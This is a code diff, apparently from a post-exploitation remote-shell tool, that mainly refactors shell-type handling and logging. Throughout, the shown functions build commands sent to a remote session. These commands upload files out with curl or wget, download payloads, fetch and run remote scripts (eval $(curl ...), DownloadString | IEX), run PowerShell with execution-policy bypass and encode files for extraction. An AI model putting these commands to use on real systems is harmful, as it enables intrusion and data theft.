@@ -1,7 +1,7 @@
 import re
 import time
 import base64
-from shell_utils.shell_factory import ShellTypes
+from shell_utils.shell_factory import Shells
 from utils.print_utils import Printer
 from utils.pwsh_utils import ObfUtil
 from queue import Queue, Empty
@@ -62,6 +62,7 @@ class SessionExec(object):
 
         cmd = self.maker.end().get_command()
 
+        Printer.dbg(f"Running {cmd}")
         self.socket.send(cmd)
         try:
             if not(get_all):
@@ -70,7 +71,7 @@ class SessionExec(object):
             else:
                 while True:
                     res += self.answer_queue.get(timeout=timeout)
-                    Printer.vlog(f"Queued answer: {res}")
+                    Printer.dbg(f"Queued answer: {res}")
                     pos = res.rfind(CmdMaker.Delimiter)
                     if pos != -1:
                         res_to_extract = res[pos + len(CmdMaker.Delimiter):]
@@ -85,10 +86,6 @@ class SessionExec(object):
                         else:
                             res = ""
 
-                    # full_res = re.findall(res_pattern, res)
-                    # if(full_res and not(self.maker.command_origin.strip() in full_res[-1])):
-                    #     break
-
         except Empty:
             pass
 
@@ -100,14 +97,14 @@ class SessionExec(object):
 
         return res.strip()
 
-    def exec_no_result(self, cmd, shell_type=ShellTypes.Basic):
-        cmd = self.maker.init_command(cmd).with_shell_type(shell_type).end().get_command()
-        Printer.vlog(f"Running {cmd}")
+    def exec_no_result(self, cmd):
+        cmd = self.maker.init_command(cmd).end().get_command()
+        Printer.dbg(f"Running {cmd}")
         self.socket.send(cmd)
 
-    def exec_all_no_result(self, list_cmd, shell_type, wait=0):
+    def exec_all_no_result(self, list_cmd, wait=0):
         for c in list_cmd:
-            self.exec_no_result(c, shell_type)
+            self.exec_no_result(c)
             if wait != 0:
                 time.sleep(wait)
 
@@ -142,15 +139,15 @@ class SessionExec(object):
 
     def upload_http(self, http_link, where, shell_type, available_bin):
         cmd = self.maker.with_shell_type(shell_type).download_from(http_link, where, available_bin).end().get_command()
-        self.exec_no_result(cmd, shell_type=shell_type)
+        self.exec_no_result(cmd)
 
     def download(self, http_link, file, shell_type, available_bin):
         cmd = self.maker.with_shell_type(shell_type).upload_file(http_link, file, available_bin).end().get_command()
-        self.exec_no_result(cmd, shell_type=shell_type)
+        self.exec_no_result(cmd)
 
     def load(self, http_link, shell_type, available_bin):
         cmd = self.maker.with_shell_type(shell_type).load_script(http_link, available_bin).end().get_command()
-        self.exec_no_result(cmd, shell_type=shell_type)
+        self.exec_no_result(cmd)
 
     def download_hex(self, file, shell_type):
         cmd = self.maker.to_hex().get_command()
@@ -171,7 +168,7 @@ class CmdMaker:
     Delimiter = "echo \"=====\""
     PatternForResult = re.compile(r'.*=====(.*?)=====', re.DOTALL)
 
-    def __init__(self, cmd="", shell_type=ShellTypes.Basic):
+    def __init__(self, cmd="", shell_type=Shells.Basic):
         self._command_origin = cmd
         self._cmd = cmd
         self.shell_type = shell_type
@@ -273,31 +270,30 @@ class CmdUtils:
     """
     @staticmethod
     def get_joiner_for_command(shell_type):
-        if(shell_type == ShellTypes.Windows):
+        if shell_type & Shells.Windows:
             return "&"
         return ";"
 
     @staticmethod
     def isolate_command(cmd, shell_type):
-        if(shell_type is ShellTypes.Powershell):
+        if shell_type & Shells.Powershell:
             return cmd
         return f'({cmd})'
 
     @staticmethod
     def get_error_catcher(command, shell_type):
-        if(shell_type == ShellTypes.Windows):
+        if shell_type & Shells.Windows:
             return f'({command}) 2> nul'
-        elif(shell_type == ShellTypes.Powershell):
+        elif shell_type & Shells.Powershell:
             return 'try{ ' + command + ' }catch{}'
-        else:
-            return f'({command}) 2>/dev/null'
+        return f'({command}) 2>/dev/null'
 
     @staticmethod
     def get_b64_decode_command(command, shell_type):
-        if(shell_type is ShellTypes.Powershell):
+        if shell_type & Shells.Powershell:
             return f'[System.Convert]::FromBase64String("{command}")'
 
-        elif(shell_type is ShellTypes.Windows):
+        elif shell_type & Shells.Windows:
             return f'powershell -ep bypass -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\"{command}\\"))"'
 
         else:
@@ -306,15 +302,15 @@ class CmdUtils:
 
     @staticmethod
     def output_to_file(filename, command, mode, shell_type):
-        if(shell_type is ShellTypes.Powershell):
+        if shell_type & Shells.Powershell:
             output = f"[IO.File]::WriteAllBytes(\"{filename}\", "
-            if(mode == FileMode.Append):
+            if mode == FileMode.Append:
                 output += f"[IO.File]::ReadAllBytes(\"{filename}\") + "
             output += f"{command})"
             return output
 
         else:
-            if(mode == FileMode.Append):
+            if mode == FileMode.Append:
                 output = f"({command}) >> {filename}"
             else:
                 output = f"({command}) > {filename}"
@@ -322,16 +318,16 @@ class CmdUtils:
 
     @staticmethod
     def get_command_for_upload(shell_type, http_link, file, available_bin):
-        if(shell_type is ShellTypes.Powershell):
+        if shell_type & Shells.Powershell:
             return f'(New-Object System.Net.WebClient).UploadFile("{http_link}", "{file}")'
 
-        elif(shell_type is ShellTypes.Windows):
+        elif shell_type & Shells.Windows:
             return f'powershell -ep bypass -c "(New-Object System.Net.WebClient).UploadFile(\\"{http_link}\\", \\"{file}\\");"'
 
-        if("curl" in available_bin):
+        if "curl" in available_bin:
             return f"curl -s -F 'minishh_dl=@{file}' '{http_link}'"
         
-        elif("wget" in available_bin):
+        elif "wget" in available_bin:
             return f"wget -O - --post-file '{file}' '{http_link}'"
 
         else:
@@ -339,19 +335,19 @@ class CmdUtils:
 
     @staticmethod
     def get_command_for_download(shell_type, http_link, where, available_bin):
-        if(shell_type is ShellTypes.Powershell):
+        if shell_type & Shells.Powershell:
             return f'(new-object system.net.webclient).downloadfile("{http_link}", "{where}")'
 
-        elif(shell_type is ShellTypes.Windows):
+        elif shell_type & Shells.Windows:
             if("curl" in available_bin):
                 return f'curl -s "{http_link}" -o "{where}"'
             return f'powershell -ep bypass -c "(new-object system.net.webclient).downloadfile(\\"{http_link}\\", \\"{where}\\");"'
 
         else:
-            if("wget" in available_bin):
+            if "wget" in available_bin:
                 return f"wget '{http_link}' -O {where}"
 
-            elif("curl" in available_bin):
+            elif "curl" in available_bin:
                 return f"curl '{http_link}' -o {where}"
 
             else:
@@ -373,15 +369,15 @@ class CmdUtils:
         ```
 
         ```python3
-        > CmdUtils.get_command_for_load(ShellTypes.Basic, 'http://127.0.0.1:9001/dnjkznker.log')
+        > CmdUtils.get_command_for_load(Shells.Basic, 'http://127.0.0.1:9001/dnjkznker.log')
         eval $(curl -s "http://127.0.0.1:9001/dnjkznker.log")
         > ^D
         ```
         """
-        if shell_type is ShellTypes.Powershell:
+        if shell_type & Shells.Powershell:
             return f'(New-Object System.Net.WebClient).DownloadString("{http_link}") | IEX'
 
-        elif shell_type is ShellTypes.Basic:
+        elif shell_type & Shells.Basic:
             if "curl" in available_bin:
                 return f'eval $(curl -s "{http_link}")'
 
@@ -395,26 +391,26 @@ class CmdUtils:
 
     @staticmethod
     def file_to_base64(filename, shell_type):
-        if(shell_type is ShellTypes.Basic or shell_type == ShellTypes.Pty):
+        if shell_type & Shells.Basic:
             return f"[ -f \"{filename}\" ] && base64 {filename} -w 0 && echo "
-        elif(shell_type is ShellTypes.Powershell):
+        elif shell_type & Shells.Powershell:
             return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.Convert]::ToBase64String($bytes)}}'
-        elif(shell_type is ShellTypes.Windows):
+        elif shell_type & Shells.Windows:
             return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.Convert]::ToBase64String($bytes)}}"'
         return None
 
     @staticmethod
     def file_to_hex(filename, shell_type):
-        if(shell_type is ShellTypes.Basic or shell_type == ShellTypes.Pty):
+        if shell_type & Shells.Basic:
             return f"[ -f \"{filename}\" ] && xxd -p {filename}"
-        elif(shell_type is ShellTypes.Powershell):
+        elif shell_type & Shells.Powershell:
             return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.BitConverter]::ToString($bytes).Replace("-","")}}'
-        elif(shell_type is ShellTypes.Windows):
+        elif shell_type & Shells.Windows:
             return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.BitConverter]::ToString($bytes).Replace(\'-\',\'\')}}"'
         return None
 
     @staticmethod
     def is_download_available(shell_type, available_bin):
-        if(shell_type in [ShellTypes.Basic, ShellTypes.Pty]):
+        if shell_type & Shells.Basic:
             return ("wget" in available_bin or "curl" in available_bin)
         return True
